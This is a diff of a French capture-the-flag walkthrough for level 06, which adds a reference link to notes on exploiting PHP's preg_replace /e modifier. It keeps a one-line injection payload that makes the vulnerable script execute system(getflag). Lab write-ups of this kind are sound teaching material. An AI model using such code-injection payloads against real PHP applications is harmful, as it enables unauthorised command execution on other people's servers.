@@ -10,7 +10,8 @@ LEVEL 06
 2.  En analysant le programme php on remarque qu'il faut passer
     en paramètre de l'exécutable un fichier.
     On va exploiter la faille preg_replace qui se situe sur cette
-    ligne: $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+    ligne (https://www.voidsecurity.in/2012/12/exploit-exercise-php-pregreplace.html)
+    : $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
 
     Commande:   echo "[x {\${@system(getflag)}}]" > /tmp/test
 
